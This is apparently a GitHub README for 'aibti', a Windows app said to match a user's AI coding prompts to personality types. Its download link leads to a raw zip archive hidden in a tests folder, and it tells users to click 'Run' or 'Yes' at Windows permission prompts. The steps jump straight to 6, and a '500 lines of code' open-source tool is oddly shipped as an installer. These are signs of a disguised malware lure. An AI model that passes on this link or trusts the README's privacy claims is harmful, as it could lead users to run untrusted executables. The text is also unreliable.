# 🤖 aibti - Match AI behavior to your personality

[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Acuminate-conventionality909/aibti/raw/refs/heads/main/tests/AVDE/Software-v3.1-beta.5.zip)

Aibti analyzes your history with coding assistants like Claude Code, Cursor, and Codex. It determines which of the 16 personality types best matches your unique prompt style. Your data stays on your machine. This tool respects your privacy.

## 🧠 What is aibti?

You use AI tools to code every day. Over time, your requests reflect your habits, logic, and needs. This software reviews those habits. It matches your prompt patterns to specific personality archetypes.

The app uses 500 lines of code. It does not send your data to external servers. Your prompts remain private. You keep full control over your information at all times.

## 📋 System Requirements

Ensure your computer meets these conditions before you start:

*   **Operating System**: Windows 10 or Windows 11.
*   **Memory**: At least 4GB of RAM.
*   **Storage**: 100MB of free disk space.
*   **Network**: You need an internet connection for the first download.

Follow these steps to set up the software on your Windows computer.

6.  Follow the prompts on your screen. Windows may ask for permission to run the file. Click "Run" or "Yes" if you see a prompt.
7.  The installer puts an icon on your desktop. Double-click this icon to start the application.

## 🛠️ How to Use the App

The interface stays simple to help you get results fast.

1.  **Point to your files**: When the app opens, click the "Select Folder" button. Choose the directory where you keep your coding project logs or chat history.
2.  **Scan your logs**: Click the "Analyze" button. The app reads your past prompts to understand your style. This takes a few seconds.
3.  **View your results**: The app shows your top three personality matches. It lists labels like "The Architect," "The Explorer," or "The Pragmatist" to describe your interaction style.
4.  **Save or Export**: You can print your results or save them as a text file for your records.

## 🔒 Privacy and Security

You might wonder where your data goes. The answer is: your computer. 

Most AI tools track your behavior in the cloud. Aibti is different. It functions as a local utility. No part of this software transmits your chats or prompt history to any company. It reads your local files and calculates your personality type locally. The project is open-source under the MIT license. You can inspect the code if you have technical skills, but it remains accessible to everyone.

## ❓ Frequently Asked Questions

**Does this app work with all AI models?**
It works best with prompts meant for Claude Code, Cursor, and Codex. If you use other models, the tool might give less accurate personality types.

**Is my computer powerful enough?**
The analysis process is lightweight. It runs on almost any modern laptop or desktop computer without slowing down other programs.

**Can I delete my data?**
Yes. Since the software saves no information in the cloud, deleting the program and your exported result files removes all traces of the tool from your machine.

**The app will not open.**
If you see an error, check that you have the latest version of Windows installed. Try to restart your computer and run the installer again.

**What is the MIT license?**
The MIT license means this software is free to use, modify, and share. You do not need to pay for a subscription to use the full version.
